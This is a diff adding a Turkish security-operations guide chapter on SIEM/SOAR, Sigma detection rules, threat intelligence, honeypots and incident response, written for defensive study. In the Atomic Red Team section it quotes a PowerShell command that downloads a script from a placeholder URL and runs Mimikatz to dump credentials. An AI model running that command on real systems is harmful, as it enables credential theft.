@@ -1,0 +1,189 @@
+# BÖLÜM 14: OPERASYONEL GÜVENLİK — SOC/SIEM, Tespit Mühendisliği, CTI, Aldatma ve Olay Müdahalesi
+
+## TL;DR
+- Operasyonel güvenlik, "Savunma Derinliği" mimarisinin tespit-müdahale katmanıdır: SIEM/SOAR ile log toplama, UEBA ile davranışsal analitik, Detection-as-Code ile Sigma tabanlı tespit, CTI/Deception ile proaktif istihbarat ve NIST SP 800-61r3 yaşam döngüsüyle olay müdahalesi bir bütün oluşturur.
+- Türkiye mevzuatı bu katmanı doğrudan şekillendirir: 5651 sayılı Kanun zaman damgalı (TÜBİTAK) log saklama, KVKK m.12/5 + 2019/10 Kurul Kararı 72 saatlik ihlal bildirimi, 7545 sayılı Siber Güvenlik Kanunu "gecikmeksizin" olay bildirimi ve BDDK BSEBY bankalar için SOME zorunluluğu getirir.
+- 2025-2026 verileri stratejik bir uyarı veriyor: Mandiant'ın küresel medyan dwell-time metriği iki yıl üst üste kötüleşti (2024'te 11, 2025'te 14 gün) — Richard Bejtlich'in vurguladığı gibi "iki kötü yıl üst üste daha önce hiç olmamıştı" ve "ekiplerin etkili olmak için bir saat içinde tespit ve sınırlama yapması gerekiyor". Bu yüzden SOC'lerin MTTD/MTTR'yi SOAR otomasyonu ve Detection Engineering olgunluğu ile saatler seviyesine çekmesi şarttır.
+
+## Key Findings
+
+**1. ISOC (Entegre SOC) ve SIEM/SOAR omurgası.** NOC ve SOC'un birleştiği ISOC mimarisinde SIEM merkezi korelasyon motoru, SOAR ise otomasyon/orkestrasyon katmanıdır. Log toplama Syslog (RFC 5424) ve Windows Event Forwarding (WEF/WEC) üzerinden yapılır; Palo Alto SOC'un ölçümüne göre Cortex XSOAR ile ortalama manuel phishing araştırması 45 dakikadan 8 dakikaya iner (%82 azalma).
+
+**2. Detection-as-Code ve Sigma.** Sigma, platform-bağımsız YAML tespit formatıdır; pySigma/sigma-cli ile Splunk, Elastic, Sentinel, QRadar gibi 40+ backend'e dönüştürülür. Git + CI/CD ile tespit kuralları yazılım gibi versiyonlanır, test edilir ve dağıtılır.
+
+**3. CTI yaşam döngüsü + Deception.** 6 fazlı istihbarat döngüsü (Planlama → Toplama → İşleme → Analiz → Yayma → Geri Besleme), STIX 2.1/TAXII 2.1 ile makineler arası paylaşım ve MISP/OpenCTI platformları ile operasyonelleşir. T-Pot honeypot platformu (Cowrie, Dionaea) düşük maliyetli, yüksek değerli erken uyarı sağlar.
+
+**4. NIST SP 800-61r3 ile dönüşen olay müdahalesi.** Nisan 2025'te yayımlanan revizyon, eski 4-fazlı yaşam döngüsünü terk edip CSF 2.0'ın 6 fonksiyonuna (Govern, Identify, Protect, Detect, Respond, Recover) eşledi. Chain of custody için ISO/IEC 27037, delil toplama için KAPE/Velociraptor kullanılır.
+
+## Details
+
+### 14.1. SOC/NOC Entegrasyonu ve Yeni Nesil Merkezi Log Yönetimi (SIEM/SOAR)
+
+**ISOC Mimarisi ve organizasyonel yapı.** Geleneksel olarak NOC (Network Operations Center) erişilebilirlik/performans (uptime, latency, kapasite), SOC (Security Operations Center) ise gizlilik/bütünlük (tehdit tespiti, olay müdahalesi) odaklıdır. Integrated SOC (ISOC) bu iki disiplini tek bir operasyonel görünürlük katmanında birleştirir; aynı telemetri (NetFlow, syslog, EDR) hem performans hem güvenlik bağlamında değerlendirilir. Katmanlı analist yapısı: Tier-1 (triyaj/alarm doğrulama), Tier-2 (derin analiz/olay müdahalesi), Tier-3 (threat hunting/detection engineering/forensics), ve bunları yöneten SOC Manager + CTI ekibi.
+
+**Log toplama mimarisi.** İki temel kanal:
+- **Syslog (RFC 5424):** Ağ cihazları, Linux sunucuları, güvenlik duvarları için standart. RFC 5424 yapısal formatı (PRI, VERSION, TIMESTAMP, HOSTNAME, APP-NAME, PROCID, MSGID, STRUCTURED-DATA) eski RFC 3164'ün yerini alır; ISO 8601 zaman damgası ve yapısal veri alanları sağlar.
+- **Windows Event Forwarding (WEF/WEC):** Microsoft'un yerel, ajan-gereksiz log merkezileştirme mekanizması. WS-Management (WinRM) protokolü üzerinden HTTP (5985) veya HTTPS (5986) ile çalışır. İki abonelik modeli vardır: **Source-Initiated (Push)** — kaynaklar GPO ile WEC sunucusunu keşfedip kendiliğinden kaydolur, binlerce uç noktaya ölçeklenir (Palantir kurumsal ortamlarda bunu önerir); **Collector-Initiated (Pull)** — WEC önceden tanımlı makinelerden çeker, belirli kritik makineleri yakın izlemek için uygundur. Toplanan olaylar varsayılan olarak "ForwardedEvents" kanalına yazılır. Pratik ölçek limiti collector başına ~10.000 kaynaktır; küresel kurumlar bölgesel WEC → merkezi WEC kademeli mimarisi kullanır. GPO yapılandırması: `Computer Configuration\Administrative Templates\Windows Components\Event Forwarding` altında SubscriptionManager dizesi (`Server=HTTPS://<WEC-FQDN>:5986/wsman/SubscriptionManager/WEC,Refresh=<saniye>,IssuerCA=<thumbprint>`).
+
+**Log ayrıştırma (Parsing).** Ham loglar regex veya Grok pattern'leri ile alanlara ayrılır. Örnek Grok pattern (Apache erişim logu): `%{IPORHOST:clientip} %{HTTPDUSER:ident} %{USER:auth} \[%{HTTPDATE:timestamp}\] "%{WORD:verb} %{NOTSPACE:request} HTTP/%{NUMBER:httpversion}" %{NUMBER:response} %{NUMBER:bytes}`. Logstash/Elastic, Splunk (props.conf/transforms.conf) ve Wazuh decoder'ları bu mantığı kullanır.
+
+**Log Zenginleştirme (Enrichment).** Ham log değeri kazanır:
+- **GeoIP:** MaxMind GeoLite2/GeoIP2 veritabanları IP'leri coğrafi konuma çevirir; "impossible travel" tespiti için temel.
+- **Threat Intelligence:** MISP, AlienVault OTX feed'leri IOC eşleştirmesi sağlar.
+- **Varlık (Asset) Bağlamı:** CMDB entegrasyonu ile IP/hostname → kritiklik/sahip/iş birimi bağlamı eklenir. CIA üçlüsüne göre varlık kritiklik etiketleme (crown jewels vs dev) önceliklendirmeyi keskinleştirir.
+
+**UEBA (Kullanıcı ve Varlık Davranış Analitiği).** ML tabanlı, her varlık için dinamik davranışsal taban çizgisi (baseline) oluşturup sapmaları tespit eder. Microsoft Sentinel UEBA iki skor üretir: **Anomaly Score (0-1)** — taban çizgisinden sapma derecesi; **Investigation Priority Score (0-10)** — araştırma önceliği. Skorlama üç referans çerçevesi kullanır: varlığın kendi geçmişi, akran grubu (peer group, TF-IDF algoritmasıyla güvenlik grubu üyeliğine göre), ve kurumsal norm. Microsoft, AWS savunması için BehaviorAnalytics tablosunun CloudTrail ile birleştirilmesini önerir ve skorların "tek başına alarm tetikleyici değil, önceliklendirme sinyali" olarak kullanılmasını tavsiye eder. Exabeam ve Splunk UBA alternatif/tamamlayıcı ürünlerdir; Exabeam Sentinel'i TDIR yetenekleriyle güçlendirir. UEBA özellikle üç tehdit kategorisini yakalar: normal izinlerle çalışan ele geçirilmiş hesaplar, içeriden tehditler, ve çalınan kimlik bilgileriyle yanal hareket.
+
+**Yasal log saklama ve zaman damgası (5651 sayılı Kanun).** 5651 sayılı "İnternet Ortamında Yapılan Yayınların Düzenlenmesi" Kanunu (2007), aktörlere göre farklı yükümlülükler getirir:
+- **Erişim sağlayıcı:** Trafik bilgisini bir yıl saklamak, doğruluk/bütünlüğü ve dosya bütünlük değerlerini **zaman damgası** ile muhafaza etmek (Madde 15/1-b).
+- **Yer sağlayıcı:** Trafik bilgilerini bir yıldan az, iki yıldan fazla olmamak üzere yönetmelikte belirlenen süre kadar saklamak (asgari 1 yıl pratikte uygulanır).
+- **Toplu kullanım sağlayıcı (otel, kafe, AVM, üniversite):** İç ağda dağıtılan IP, MAC, başlama/bitiş zamanlarını kaydetmek; erişim kayıtlarını iki yıl saklamak.
+
+Teknik gereksinimler: NTP senkronizasyonu (tutarlı zaman), **TÜBİTAK Kök Zaman Damgası** ile HASH imzalama (değiştirilemezlik ispatı), logların şifrelenmesi ve operasyonel sistemlerden ayrı bağımsız log sunucusunda tutulması, erişim kısıtlaması. Saklama süresine ilişkin kaynaklar farklı değerler verir (1 yıl / 2 yıl / 3-5 yıl önerisi); bu çelişki kanun-yönetmelik-Anayasa Mahkemesi kararı sıralamasından kaynaklanır, bu yüzden kurumlar hukuk birimine danışmalıdır.
+
+**Veri Hacmi Yönetimi (Hot/Warm/Cold/Frozen).** SIEM maliyet optimizasyonunun temelidir. Elasticsearch ILM (Index Lifecycle Management) beş faz tanımlar (Hot, Warm, Cold, Frozen, Delete). Örnek ILM policy: rollover 50GB/7 gün → warm 2 gün sonra → cold 14 gün → frozen 30 gün → delete 90 gün. Tipik tasarruf: 10TB/gün × 90 gün = tüm-hot için 900TB iken, kademeleme ile 70TB hot + 230TB warm + 600TB cold = %60-70 maliyet azalımı. Cold katmanda searchable snapshot replikasız tutularak disk ~%50 azalır; Frozen katman veriyi tamamen nesne depolamada (S3/Glacier) tutar, depolama maliyeti hot-SSD'ye göre 10-20x ucuzdur. Düğüm rolleri: `data_hot` (SSD, yüksek CPU), `data_warm` (HDD), `data_cold` (yoğun depolama), `data_frozen`.
+
+Örnek Elasticsearch ILM policy:
+```json
+{"policy":{"phases":{
+  "hot":{"min_age":"0ms","actions":{"rollover":{"max_size":"50gb","max_age":"7d"}}},
+  "warm":{"min_age":"7d","actions":{"shrink":{"number_of_shards":2},"forcemerge":{"max_num_segments":1},"set_priority":{"priority":50}}},
+  "cold":{"min_age":"30d","actions":{"searchable_snapshot":{"snapshot_repository":"found-snapshots"}}},
+  "delete":{"min_age":"90d","actions":{"delete":{}}}
+}}}
+```
+
+**SOAR (Security Orchestration, Automation and Response).** Playbook'lar görsel sürükle-bırak iş akışlarıdır; ana playbook (parent) + alt playbook (sub-playbook) DRY prensibiyle yeniden kullanılabilir bloklar olarak tasarlanır. Cortex XSOAR Phishing - Generic v3 playbook'u: e-posta alımı → indikatör çıkarma (URL/hash/IP) → itibar hesaplama (threat DB cross-reference) → severity hesaplama → kullanıcıyla etkileşim → kampanya tespiti (FindEmailCampaign ile benzer olayları ML ile gruplama) → manuel/otomatik remediation. Palo Alto'ya göre Cortex XSOAR yanıt aksiyonlarının %95'ine kadarını otomatikleştirebilir ("automates up to 95% of response actions"). Diğer ürünler: Splunk SOAR (eski Phantom), Microsoft Sentinel Logic Apps/Playbooks.
+
+### 14.2. Detection Engineering ve Tehdit Avcılığı (Threat Hunting)
+
+**Detection-as-Code (DaC).** Tespit kuralları yazılım artefaktı gibi ele alınır: Git ile versiyon kontrolü, pull request ile peer review, CI/CD pipeline ile otomatik test (unit test + false positive testi) ve dağıtım. Bu yaklaşım kural değişikliklerini izlenebilir, geri alınabilir ve denetlenebilir kılar; "her bilgi tek, kesin ve yetkili bir temsile sahip olmalı" (DRY) prensibine dayanır.
+
+**Sigma kuralları.** Platform-bağımsız YAML tespit formatı. Yapı: `title`, `id`, `status`, `logsource` (category/product/service), `detection` (selection grupları + condition), `falsepositives`, `level`, `tags` (MITRE ATT&CK T-numaraları). Mantık: YAML listesi = OR, dictionary = AND. Modifier'lar (`|contains`, `|startswith`, `|endswith`, `|all`, `|cidr`, `|base64`) esneklik sağlar.
+
+Örnek Sigma kuralı (PowerShell şüpheli indirme, T1059.001):
+```yaml
+title: Suspicious PowerShell Download
+status: experimental
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains|all:
+      - 'http'
+      - 'download'
+  condition: selection
+falsepositives:
+  - Legitimate admin scripts
+level: medium
+tags:
+  - attack.execution
+  - attack.t1059.001
+```
+
+**Sigma-to-SIEM dönüşümü.** pySigma framework + sigma-cli. Backend "sürücü" rolündedir (condition'ı hedef sorgu diline çevirir), processing pipeline ise alan eşleme/log kaynağı dönüşümünü yapar. Komutlar:
+```bash
+pip install sigma-cli
+sigma convert -t splunk -p sysmon rule.yml
+sigma convert -t elasticsearch -p ecs_windows rule.yml
+sigma convert -t microsoft365defender rule.yml
+```
+pySigma korelasyon kuralları (event_count, value_count, temporal) ile durumsal tespiti destekler (şu an ES|QL ve Splunk SPL'de).
+
+**Detection olgunluk modelleri.** MITRE ATT&CK Coverage Matrix tespit kapsamını teknik bazında görselleştirir (ATT&CK Navigator layer dosyaları ile). DEMM (Detection Engineering Maturity Matrix) tespit programının olgunluğunu (kural kalitesi, test, otomasyon, dokümantasyon) ölçer.
+
+**Yanlış Pozitif/Negatif yönetimi ve tuning.** Süreç akışı: alarm üretimi → false positive analizi → kural ayarı (selection daraltma, filter ekleme) → yeniden test → dağıtım. Metrikler: false positive rate, signal-to-noise ratio, alert volume. Haftalık FP review ve sürekli kural tuning, alert fatigue'i önler.
+
+**Proaktif Threat Hunting.** Hipotez geliştirme metodolojileri:
+- **PEAK (Prepare, Execute, Act with Knowledge):** Splunk SURGe ekibi tarafından geliştirilen vendor-agnostik çerçeve. Üç av tipi: Hypothesis-Driven, Baseline, Model-Assisted (M-ATH). Her av üç aşamadan oluşur (Prepare, Execute, Act). **ABLE** çerçevesi hipotez bileşenlerini yakalar: **A**ctor (tehdit aktörü), **B**ehavior (TTP), **L**ocation (ağ konumu), **E**vidence (kanıt).
+- **TaHiTI (Targeted Hunting integrating Threat Intelligence):** İstihbarat-güdümlü hunting metodolojisi.
+- **MITRE ATT&CK** her iki çerçevede de hipotez kaynağı ve kapsama haritası olarak kullanılır.
+
+**Hunting-to-Detection döngüsü.** Başarılı bir av (özellikle tekrarlanabilir olanlar) kalıcı tespit kuralına dönüştürülür: PEAK'in "Act" aşamasında bulgular "Create Detections" adımıyla Sigma kuralına/SIEM korelasyonuna kodlanır, kapsam dışı fikirler backlog'a eklenir.
+
+**Network Forensics (Zeek/Suricata).** Zeek (eski Bro), pasif trafik analiziyle protokol-farkında, forensik-kalite telemetri üretir — IDS değil, kayıt motorudur. Temel loglar: `conn.log` (L3/L4 bağlantı özeti), `dns.log`, `http.log`, `ssl.log`, `files.log`, `x509.log`, vb. Forensik omurga **`uid` alanıdır**: her bağlantı eşsiz bir UID alır; aynı UID DNS/HTTP/SSL/file olaylarında tekrarlanır, böylece analist şüpheli bir conn.log kaydından ilgili tüm aktiviteye pivot yapabilir. conn.log TSV başlık alanları: `ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state ... history`. conn_state alanı (örn. `SF` = normal kurulum/sonlandırma), history alanı taraf davranışını gösterir. DNS analizi C2/tünelleme/DoH-DoT tespiti için kritiktir. Suricata imza-tabanlı IDS/IPS olarak Zeek'i tamamlar.
+
+### 14.3. Siber Tehdit İstihbaratı (CTI) ve Aldatma Teknolojileri (Deception)
+
+**CTI Yaşam Döngüsü (6 faz).** CrowdStrike ve Recorded Future kanonik 6-fazlı modeli kullanır:
+1. **Planlama & Yönlendirme (Requirements):** Tüketiciler ve istenen çıktılar belirlenir.
+2. **Toplama (Collection):** Trafik logları, açık kaynaklar (OSINT), forumlar, sosyal medya, uzmanlardan veri toplanır.
+3. **İşleme (Processing):** Ham veri analiz edilebilir formata getirilir (organizasyon, çözme, çeviri, ilgi/güvenilirlik değerlendirmesi).
+4. **Analiz (Analysis):** Requirement sorularına eyleme dönük yanıtlar üretilir.
+5. **Yayma (Dissemination):** Analiz paydaşlara sindirebilir formatta sunulur (rapor/sunum).
+6. **Geri Besleme (Feedback):** Gelecek operasyonlar için ayarlamalar belirlenir.
+
+Üç CTI türü: **Taktik** (IOC'ler, çoğunlukla otomatik), **Operasyonel** (TTP'ler, motivasyon), **Stratejik** (jeopolitik, CISO/CIO için). Bazı kurumlar 4-fazlı (Direction → Collection → Analysis → Dissemination) varyantı kullanır; CrowdStrike'ın kendisi "istihbarat döngüsünün birçok varyantı var" der.
+
+**IoC vs IoA.** **IoC (Indicator of Compromise):** İhlalin gerçekleştiğine dair geriye dönük/forensik kanıt (hash, IP, domain, registry key, dosya adı). Reaktif. CrowdStrike: "IOC'ler, neyin tehdit olduğunu bilmeniz gereken, yeniden markalanmış imzalardan başka bir şey değildir." **IoA (Indicator of Attack):** Saldırganın kullandığı araçtan bağımsız olarak **niyetini/davranışını** tespit eder. Proaktif. Örnek IoA: bir Office sürecinin PowerShell başlatıp base64-decode etmesi, kalıcılık kurması ve dışarı beacon atması — bilinen kötü dosya olmasa bile (Volume Shadow Copy silinmesi de tipik ransomware IoA'sıdır). SIEM çoğunlukla IoC ile, EDR/XDR ise IoA davranışsal tespitiyle çalışır.
+
+**Pyramid of Pain (David Bianco, 2013).** Bir indikatörü engellemenin saldırgana ne kadar "acı" verdiğini gösteren 6 seviye (Bianco'nun orijinal etiketleriyle): **Hash (TRIVIAL)** → **IP (EASY)** → **Domain (SIMPLE)** → **Network/Host Artifacts (ANNOYING)** → **Tools (CHALLENGING)** → **TTPs (TOUGH)**. TTP seviyesinde savunma, saldırganı metodolojisini temelden değiştirmeye zorlar — diğer tüm IOC'ler geçicidir, davranış kalıcıdır. Örneğin saldırgan ayrıcalık yükseltme için ayrıcalıklı kimlik bilgisi çalmaya dayanıyorsa ve PAM'e yatırım yaptıysanız, bu onlar için "tough/impossible" olur. MITRE'nin "Summiting the Pyramid" projesi TTP katmanını daha da bölümlendirir.
+
+**STIX 2.1 / TAXII 2.1.** OASIS CTI Teknik Komitesi standartları (Haziran 2021'de yayımlandı). **STIX 2.1:** JSON tabanlı, transport-bağımsız; 18 Domain Object (SDO), 18 Cyber-observable Object (SCO), Relationship Object (SRO) ve vocabulary setleri ile CTI'yi standartlaştırır. STIX 2.1'de Cyber Observable Container deprecate edildi, SRO kullanımı önerilir. Bundle objeleri toplu STIX verisini taşır. **TAXII 2.1:** STIX objelerini taşımak için RESTful uygulama katmanı protokolü; otomatik dağıtım sağlar.
+
+**MITRE ATT&CK Navigator.** İstihbarat kapsamasını ve tespit boşluklarını ATT&CK matrisi üzerinde renkli katmanlarla görselleştirir; layer dosyaları (JSON) kapsama haritalarını paylaşılabilir kılar.
+
+**MISP (Malware Information Sharing Platform).** CIRCL (Luxembourg) tarafından geliştirilen açık kaynak TIP. Event-merkezli veri modeli: Events → Attributes (IOC'ler) → Objects/Templates. Correlation Engine yeni indikatörleri mevcut veriyle otomatik ilişkilendirir. Paylaşım Sharing Groups + ownership modeliyle yönetilir, MISP instance'ları birbiriyle senkronize olur (ISAC'lar, devlet, özel sektör). **Taxonomies** = etiket kütüphaneleri (TLP, Admiralty Scale); **Galaxies** = bilgi kümeleri (threat actor, malware, ve MITRE ATT&CK matrisi). STIX 2.1 import/export (misp-stix kütüphanesi) ve TAXII publishing destekler (TAXII 2 entegrasyonu MISP projesine göre hâlâ olgunlaşıyor). IDS/SIEM için Suricata/Snort kuralı export edebilir. *Örnek:* Bir ulusal CERT, phishing kampanyasını MISP Event olarak zenginleştirir (attribute'lar = kötü amaçlı domain'ler, hash'ler, C2 IP'leri), `tlp:amber` ile etiketler, ATT&CK galaxy cluster'ını bağlar; event üye kurumlara otomatik senkronize olur ve STIX 2.1 bundle + Suricata kural seti olarak export edilir.
+
+**OpenCTI (Filigran).** STIX 2.1'i neredeyse tümüyle kullanan açık kaynak TIP. Mikroservis mimarisi (ElasticSearch, Redis, RabbitMQ, MinIO); bilgi STIX-yapılı bilgi hipergrafı olarak saklanır. Veri modeli SDO/SCO/SRO temelli. **Connectors** platformun temel taşı: External Import (MISP, ATT&CK, CVE feed → STIX 2.1 bundle), Internal Enrichment (VirusTotal, Shodan), Stream (SIEM/XDR/EDR'a canlı besleme), Internal Import File. **MISP vs OpenCTI:** MISP event-merkezli, gerçek-zamanlı kurumlar-arası IOC paylaşımında güçlü, öğrenmesi kolay; OpenCTI graf-merkezli, korelasyon/bilgi yönetimi/görselleştirmede (actor↔malware↔TTP↔indicator) güçlü, öğrenme eğrisi dik.
+
+**Aldatma Teknolojileri (Deception).** 
+- **Düşük etkileşimli honeypot:** Servisleri taklit eder (Dionaea — SMB/FTP/MSSQL/MySQL/MQTT, malware yakalama; Honeytrap — protokol-agnostik fallback). Düşük risk, sınırlı veri.
+- **Yüksek/orta etkileşimli honeypot:** Gerçek/tam işlevsel ortam (Cowrie — SSH/Telnet, orta modda Python ile Unix shell emülasyonu, yüksek modda komutları başka sisteme proxy'ler; tam oturum yakalama). Yüksek değer, yüksek risk (izole edilmeli).
+- **T-Pot (Telekom Security):** 20+ honeypot'u (Cowrie, Dionaea, Conpot ICS, Heralding, Glastopf, vb.) Docker konteynerlerinde toplayan all-in-one platform; Elastic Stack + Kibana ile görselleştirme, canlı Attack Map.
+- **Honeynet:** Birden çok honeypot'tan oluşan ağ (Honeynet Project), koordineli saldırı analizi.
+- **Honeymonkey:** Aktif olarak kötü amaçlı siteleri ziyaret edip istemci-taraflı exploit'leri tespit eden istemci honeypot.
+
+**Adversary Emulation.** 
+- **MITRE Caldera:** MITRE'nin açık kaynak otomatik adversary emulation platformu. Asenkron Python backend (aiohttp), REST API + VueJS web arayüzü, asenkron C2 sunucusu. Bileşenler: Abilities (ATT&CK'a haritalı YAML tanımlı yetenekler), Adversaries (profiller), Operations (çok-adımlı emülasyon kampanyaları), Planners (karar motoru), Fact sources, Agents. Varsayılan **Sandcat** ajanı (GoLang, çapraz-platform) HTTP/S ile yapılandırılabilir beacon/jitter ile haberleşir. Yüzlerce ajanı binlerce host'ta destekler; ICS/OT plugin'leri (örn. Modbus) ile genişletilebilir.
+- **Atomic Red Team (Red Canary):** MITRE ATT&CK'a haritalı test kütüphanesi (Ekim 2017'de ~75 testle başladı). Resmi GitHub deposu "1700+ atomic" ifadesini kullanır; Picus Security analizi spesifik olarak 261 ATT&CK tekniği ve 1.225 atomic test belirtir — yani kaynaklar arasında küçük sayısal farklar vardır. Her teknik için "T#" klasörü, içinde YAML + Markdown. Her atomic test: metadata (isim, açıklama, platform) + execution (executor, komut, input arguments, prerequisites, cleanup_command). Çalıştırma: Invoke-Atomic (PowerShell) veya atomic-operator (Python). Örnek — T1059.001 Atomic Test #1 "Mimikatz": `powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"`. Red Canary'ye göre "atomic testler beş dakikadan kısa sürede çalışır ve minimum kurulum gerektirir".
+
+### 14.4. Olay Müdahale, Playbook Yönetimi ve Delil Zinciri
+
+**Olay Müdahale Yaşam Döngüsü — NIST SP 800-61.** İki referans model birlikte ele alınmalıdır:
+- **SANS / NIST SP 800-61r2 (eski, hâlâ yaygın):** 6 adım — Hazırlık (Preparation), Tespit & Analiz (Detection & Analysis), Sınırlandırma (Containment), Yok Etme (Eradication), Kurtarma (Recovery), Ders Çıkarma (Post-Incident/Lessons Learned). SANS modeli Containment/Eradication/Recovery'yi ayrı 3 adım olarak sayar (toplam 6).
+- **NIST SP 800-61r3 (Nisan 2025, güncel):** Katı yaşam döngüsünü terk edip olay müdahalesini **CSF 2.0'ın 6 fonksiyonuna** eşledi: **Govern, Identify, Protect** (hazırlık — olay müdahalesinin parçası değil, daha geniş risk yönetimi), **Detect, Respond, Recover** (asıl müdahale). "Improve" sürekli iyileştirme olarak tüm döngüye yayıldı (artık sadece kapanışta lessons learned değil). r3, r2'yi supersede etti ama r2'nin somut prosedürel önerileri hâlâ değerli.
+
+**Blue/Red/Purple Teaming.**
+- **Red Team (Ofansif):** Gerçek saldırganları emüle eder, tam kill chain'i çalıştırır (Metasploit, Cobalt Strike, C2, phishing). Klasik red-team'de blue team ile etkileşim sınırlıdır — amaç blue'nun tespit/engelleme yeteneğini ölçmek.
+- **Blue Team (Defansif):** İzler, tespit eder, müdahale eder (SOC, SIEM, EDR, hunting).
+- **Purple Team (İşbirlikçi):** Red ve Blue'yu entegre eder. Red bir tekniği çalıştırırken Blue gerçek zamanlı gözlemler, tespit geliştirir/doğrular ve yeniden test eder. 4-fazlı döngü: Planlama → CTI Seçimi → Yürütme → Ders Çıkarma.
+- **Adversary Emulation vs Simulation:** Emülasyon belirli bir adlı tehdit aktörünü (APT29 gibi) gerçek istihbaratla taklit eder (MITRE ATT&CK Emulation Plans). Simülasyon ise belirli bir aktöre bağlı olmadan, ortamda işleyen TTP'lerle gerçekçi saldırı-benzeri aktivite üretir. (Bu ayrım sektörde tam mutabık değildir; NVISO/SANS çerçevesi en titiz olanıdır.)
+
+**Chain of Custody (ISO/IEC 27037:2012).** Dijital delilin tanımlama (identification), toplama (collection), edinim (acquisition), koruma (preservation) süreçlerini standartlaştırır. Roller: **DEFR** (Digital Evidence First Responder), **DES** (Digital Evidence Specialist). Chain of custody kaydı delilin kronolojik hareketini belgeler (kim, ne zaman, neden check-in/out). Teknik formül: **SHA-256 hash** (edinim anında hesaplanır, bütünlük), **qualified timestamp** (eIDAS, "ne zaman"), **qualified electronic seal** (sorumlu organizasyon), **custody register**. Write-blocker kullanımı ve bit-stream image (dosya kopyası değil) zorunludur. Volatil veri (RAM) öncelik sırasına göre toplanır.
+
+**Delil toplama araçları.** 
+- **KAPE (Kroll Artifact Parser and Extractor):** Hedefli artefakt toplama ve ayrıştırma (triage).
+- **Velociraptor:** Açık kaynak DFIR platformu; ölçekli endpoint görünürlüğü, VQL ile hunt, uzaktan delil toplama.
+
+**SOC Metrikleri ve benchmark'lar.**
+- **MTTD (Mean Time to Detect):** Σ tespit süresi / olay sayısı. SANS 2023 Incident Response Survey: en iyi %25 kurum olayları 60 dakika içinde, yarıdan fazlası 5 saat içinde tespit eder.
+- **MTTR (Mean Time to Respond/Remediate):** Tespit → tam sınırlama/remediation.
+- **Dwell Time:** Saldırganın ilk erişimden tespite kadar tespit edilmeden kaldığı süre. **Mandiant M-Trends 2026 (24 Mart 2026, 500.000+ saatlik IR analizi):** küresel medyan dwell-time 2024'te 11, 2025'te 14 güne yükseldi (2011'de 400+ gündü; iki yıl üst üste kötüleşme ilk kez yaşandı). Artış başlıca casusluk ve Kuzey Koreli IT-çalışanı operasyonlarından (medyan 122 gün) kaynaklandı. Ransomware dwell-time çok daha kısa (~5 gün). **IBM Cost of a Data Breach Report 2025 (Ponemon, 600 kuruluş):** yoğun AI/otomasyon kullanan kurumlar breach yaşam döngüsünü 80 gün kısalttı ve breach başına 1,9M$ tasarruf etti ($3,62M vs $5,52M); küresel ortalama maliyet 5 yılda ilk kez düşerek 4,44M$'a indi; ortalama yaşam döngüsü 241 gün (158 tespit + 83 sınırlama) ile 9 yılın en düşüğü oldu. Etkili olmak için hedef saatler seviyesinde tespit/sınırlamadır.
+
+**Tabletop Exercise.** Senaryo-tabanlı masaüstü tatbikatı: senaryo tasarımı (ör. ransomware, insider, tedarik zinciri), katılımcı rolleri (IC, teknik ekip, hukuk, iletişim, yönetim), enjektler ve değerlendirme. KVKK 2019/10 ve müdahale planı pratikleri yılda en az bir kez tatbikat önerir.
+
+**Kriz İletişimi ve Post-Breach (Türkiye mevzuatı).**
+- **KVKK m.12/5 + 2019/10 Kurul Kararı:** "İşlenen kişisel verilerin kanuni olmayan yollarla başkaları tarafından elde edilmesi hâlinde" veri sorumlusu **72 saat içinde** Kurul'a, **makul süre içinde** ilgili kişilere bildirir. 72 saat aşılırsa gecikme gerekçesi açıklanır; tüm bilgiler hazır değilse aşamalı bildirim yapılır. Yüksek risk göstergeleri (özel nitelikli veri, finansal veri, TC kimlik) ilgili kişiye bildirimi tetikler. İhlal müdahale planı hazırlanmalı ve yılda bir gözden geçirilmelidir. Bildirim, KVKK Veri İhlal Bildirim Sistemi (ihlalbildirim.kvkk.gov.tr) üzerinden yapılır. İdari para cezası 2026 projeksiyonuyla 17 milyon TL üzerine çıkar.
+- **7545 sayılı Siber Güvenlik Kanunu (19 Mart 2025):** Siber olaylar/zafiyetler **"gecikmeksizin"** Siber Güvenlik Başkanlığı'na bildirilir (pratikte 24-72 saat beklenir). Belirli kriterleri karşılayan kuruluşlar (kritik altyapı: enerji, ulaştırma, finans, sağlık, telekom) **SOME** kurmakla yükümlüdür. Yaptırımlar ağırdır: olay bildirmeme 10M TL'ye varan idari para cezası, denetim ihlali brüt satış hasılatının %5'ine kadar, bilgi vermeme/erişim engelleme 1-3 yıl hapis. Alt düzenlemeler 19 Mart 2026'ya kadar beklenir; log saklama standartlarını detaylandıracak.
+- **BDDK BSEBY (Bankaların Bilgi Sistemleri ve Elektronik Bankacılık Hizmetleri Yönetmeliği, 15 Mart 2020, yürürlük 1 Temmuz 2020):** Bilgi sistemleri yönetimi, siber olay yönetimi ve kurumsal SOME sorumluluklarını ayrıntılandırır; hassas/kişisel veri sorgulama kayıtlarının saklanması ve yurt dışına aktarım sınırlamaları getirir. Bilgi sistemleri bağımsız denetimi (BSD Yönetmeliği) COBIT yerine BSEBY referansına geçti.
+
+## Recommendations
+
+**Aşama 1 — Temel görünürlük ve uyum (0-3 ay).** WEF/WEC veya Syslog ile merkezi log toplamayı kurun; 5651 kapsamındaysanız TÜBİTAK zaman damgalı, ayrı/değiştirilemez log sunucusu ve NTP senkronizasyonunu derhal devreye alın (yasal delil niteliği için kritik). SIEM'de Hot/Warm/Cold/Frozen ILM policy tanımlayarak maliyeti kontrol altına alın. KVKK 72 saat ve 7545 "gecikmeksizin" bildirim için olay müdahale planı + iletişim matrisi hazırlayın. **Eşik:** Tüm kritik varlıklardan (DC, DNS, firewall, EDR) log akışı %95+ olmalı.
+
+**Aşama 2 — Tespit mühendisliği ve otomasyon (3-9 ay).** Sigma + Git + CI/CD ile Detection-as-Code pipeline kurun; ATT&CK Coverage Matrix ile kapsama boşluklarını haritalayın. SOAR playbook'larıyla phishing/malware containment gibi yüksek-hacimli olayları otomatikleştirin (XSOAR phishing örneğinde 45→8 dk, %82 azalma). UEBA'yı (Sentinel/Exabeam) compromised account ve insider tespiti için devreye alın. **Eşik:** MTTD'yi <60 dakika (SANS top-25%), MTTR'yi <24 saat hedefleyin; FP oranı haftalık tuning ile düşürülmeli.
+
